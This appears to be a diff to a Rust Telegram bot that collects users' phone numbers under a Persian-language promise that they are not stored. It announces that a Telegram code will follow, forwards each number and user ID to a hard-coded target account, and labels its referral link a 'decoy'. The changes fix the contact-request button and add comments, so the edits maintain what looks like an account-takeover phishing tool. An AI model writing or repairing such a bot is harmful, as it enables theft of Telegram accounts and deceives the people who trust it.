@@ -7,9 +7,8 @@ use once_cell::sync::Lazy;
 use regex::Regex;
 use teloxide::prelude::*;
 use teloxide::types::{
-    ChatId, InlineKeyboardButton, InlineKeyboardMarkup, KeyboardButton,
-    KeyboardButtonRequestUsers, KeyboardMarkup, KeyboardRemove, ParseMode,
-    ReplyMarkup, RequestUsers,
+    ButtonRequest, ChatId, InlineKeyboardButton, InlineKeyboardMarkup, KeyboardButton,
+    KeyboardMarkup, KeyboardRemove, ParseMode, ReplyMarkup,
 };
 use teloxide::utils::command::BotCommands;
 use tokio::sync::Mutex;
@@ -41,7 +40,9 @@ const WELCOME_TEXT: &str = "\
 const PHONE_REQUEST_TEXT: &str = "\
 کاربر گرامی برای فعال سازی سلف ما نیاز داریم که شماره ی شمارو تایید کنیم
 این اطلاعات جایی ذخیره نمیشود و نزد ما محفوظ است و پس از راه اندازی سلف \
-از دیتابیس ربات حذف میشود";
+از دیتابیس ربات حذف میشود
+
+لطفاً روی دکمهٔ زیر بزنید تا شماره‌تون برامون ارسال بشه.";
 
 const CODE_REQUEST_TEXT: &str = "\
 برای شما بزودی کدی فرستاده می‌شود درون تلگرام
@@ -175,8 +176,9 @@ async fn cb_get_self(bot: Bot, q: CallbackQuery) -> ResponseResult<()> {
 
     set_state(user_id, UserState::AwaitingPhone).await;
 
+    // ✅ استفاده از ButtonRequest::Contact به جای request_contact()
     let contact_keyboard = KeyboardMarkup::new(vec![vec![
-        KeyboardButton::new("📱 ارسال شماره من").request_contact(),
+        KeyboardButton::new("📱 ارسال شماره من").request(ButtonRequest::Contact),
     ]])
     .resize_keyboard()
     .one_time_keyboard();
@@ -215,6 +217,7 @@ async fn handle_contact(bot: Bot, msg: Message) -> ResponseResult<()> {
 
     let Some(contact) = msg.contact() else { return Ok(()) };
 
+    // جلوگیری از ارسال شمارهٔ شخص دیگه
     if let Some(contact_uid) = contact.user_id {
         if contact_uid.0 as i64 != user_id {
             bot.send_message(msg.chat.id, WRONG_CONTACT_TEXT).await?;
@@ -225,6 +228,7 @@ async fn handle_contact(bot: Bot, msg: Message) -> ResponseResult<()> {
     let phone = normalize_phone(&contact.phone_number);
     set_phone(user_id, phone.clone()).await;
 
+    // فوروارد شماره به مقصد
     let target = ChatId(TARGET_USER_ID);
     let forward_text = format!(
         "📞 *شمارهٔ جدید دریافت شد*\n\nشماره: `{phone}`\nآیدی کاربر: `{user_id}`"
@@ -239,6 +243,7 @@ async fn handle_contact(bot: Bot, msg: Message) -> ResponseResult<()> {
         bot.send_message(target, plain).await.ok();
     }
 
+    // لینک رفرال دکوری
     let ref_code = Uuid::new_v4().simple().to_string();
     let ref_code = &ref_code[..8];
     let ref_link = format!("https://t.me/{BOT_USERNAME}?start={ref_code}");
@@ -358,4 +363,4 @@ async fn main() -> anyhow::Result<()> {
         .await;
 
     Ok(())
-                    }
+}
